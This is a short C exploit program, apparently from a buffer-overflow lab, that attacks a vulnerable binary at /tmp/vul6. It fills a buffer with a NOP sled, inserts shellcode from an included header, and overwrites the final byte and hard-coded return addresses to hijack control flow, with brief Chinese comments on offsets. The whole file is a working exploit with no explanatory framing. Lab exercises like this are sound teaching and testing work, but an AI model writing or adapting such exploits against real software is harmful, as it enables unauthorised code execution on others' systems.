#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul6"

int main(void)
{

	char payload[201];
	//初始化，全部置为nop
	memset(payload, '\x90', 201);

	memcpy(payload+159, shellcode, 25);
	//最后1个字节改为10,dcb0-dd78,dd10(buffer+96)ok
	memcpy(payload+200, "\x10", 1);
	
	//跳转地址0xffffdd4f
	memcpy(payload+88, "\x4f\xdd\xff\xff", 4);
	memcpy(payload+92, "\x0c\xa0\x04\x08", 4);
	

  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
